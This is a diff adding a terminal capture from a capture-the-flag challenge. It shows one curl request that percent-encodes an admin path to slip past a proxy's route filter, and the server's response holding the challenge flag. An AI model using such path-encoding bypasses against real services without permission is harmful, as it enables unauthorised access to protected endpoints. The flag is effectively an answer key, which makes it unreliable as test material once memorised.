@@ -1,0 +1,8 @@
+whitehat80@LAPTOP-8KGACGG4:/mnt/c/Users/Rakesh R K/Downloads/bitsctf/rusty_proxy$ curl -i "http://rusty-proxy.chals.bitskrieg.in:25001/%61dmin/flag" -H "Host: rusty-proxy.chals.bitskrieg.in"
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 55
+Date: Fri, 20 Feb 2026 06:10:03 GMT
+Server: Cheroot/11.1.2
+
+{"flag":"BITSCTF{tr4il3r_p4r51n6_15_p41n_1n_7h3_4hh}"}
